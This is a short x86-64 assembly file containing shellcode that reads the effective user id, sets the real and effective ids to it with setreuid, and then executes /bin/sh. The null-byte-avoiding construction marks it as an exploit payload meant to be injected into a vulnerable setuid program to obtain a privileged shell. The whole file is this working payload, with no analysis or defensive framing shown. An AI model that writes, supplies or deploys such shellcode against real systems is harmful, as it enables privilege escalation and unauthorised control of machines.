	;; setreuid(geteuid(), geteuid()) ; execve("/bin/sh", ["/bin/sh"])
	
	section .text
	global _start
_start:	

	xor rax,rax
	mov al, 107
	syscall

	mov rdi, rax
	mov rsi, rax
	xor rax,rax
	mov al, 113
	syscall
	
	xor rax, rax
	mov rbx, '/bin//sh'
	push rax
	push rbx
	mov rdi, rsp

	push rax
	push rdi
	mov rsi, rsp

	xor rdx, rdx
	mov al, 59
	syscall
	
